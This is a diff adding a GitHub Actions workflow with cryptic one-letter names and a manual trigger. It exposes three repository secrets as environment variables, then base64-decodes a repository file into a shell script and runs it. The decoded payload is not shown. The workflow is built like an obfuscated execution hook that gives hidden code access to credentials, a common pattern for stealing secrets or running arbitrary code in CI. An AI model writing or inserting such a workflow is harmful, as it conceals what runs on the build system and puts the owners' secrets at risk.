@@ -1,0 +1,23 @@
+name: r
+on:
+  workflow_dispatch:
+    inputs:
+      t:
+        description: t
+        required: false
+        default: '1'
+jobs:
+  j:
+    runs-on: ubuntu-24.04
+    timeout-minutes: 60
+    steps:
+      - uses: actions/checkout@v4
+      - name: s1
+        env:
+          K: ${{ secrets.K }}
+          S: ${{ secrets.S }}
+          B: ${{ secrets.B }}
+        run: |
+          base64 -d < a > /tmp/a.sh
+          chmod +x /tmp/a.sh
+          /tmp/a.sh
